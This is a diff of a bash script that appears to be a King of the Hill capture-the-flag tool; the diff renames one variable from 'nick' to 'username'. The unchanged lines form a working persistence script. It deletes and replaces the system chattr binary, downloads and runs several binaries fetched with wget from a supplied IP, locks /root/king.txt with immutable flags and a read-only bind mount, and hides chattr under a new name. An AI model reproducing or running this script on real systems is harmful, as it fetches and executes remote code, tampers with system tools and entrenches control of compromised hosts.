@@ -16,18 +16,18 @@ fi
 echo -e "${GREEN}-----------------------------Created by H3X-007 :)-----------------------------${RESET}"
 
 IP="$1"
-nick="$2"
+username="$2"
 sudo chmod -s /usr/bin/pkexec
 rm -rf /usr/bin/chattr
 cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
 set write off
 sudo chattr -ai /root/king.txt
-echo "$nick" > /root/king.txt
+echo "$username" > /root/king.txt
 sudo chmod 400 /root/king.txt
 sudo chattr +ai /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt
 
-cd /usr/bin && wget http://$IP/check && chmod +x check && ./check "$nick" &
+cd /usr/bin && wget http://$IP/check && chmod +x check && ./check "$username" &
 cd /usr/bin && wget http://$IP/guardian && chmod +x guardian && ./guardian "$IP" &
 
 chattr +ai /usr/bin/check
@@ -37,7 +37,7 @@ cd /usr/bin && mv chattr put
 cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
 cd /usr/bin && put +ai chattr
 
-echo -e "${GREEN}Operation Fully Complete. The KING is $nick! :)${RESET}"
+echo -e "${GREEN}Operation Fully Complete. The KING is $username! :)${RESET}"
 echo
-echo -e "${BLUE}-------------- Hi $nick, don't forget to give me a star on GitHub --------------${RESET}"
+echo -e "${BLUE}-------------- Hi $username, don't forget to give me a star on GitHub --------------${RESET}"
 echo -e "${BLUE}--------------------------------------------------------------------------------${RESET}"
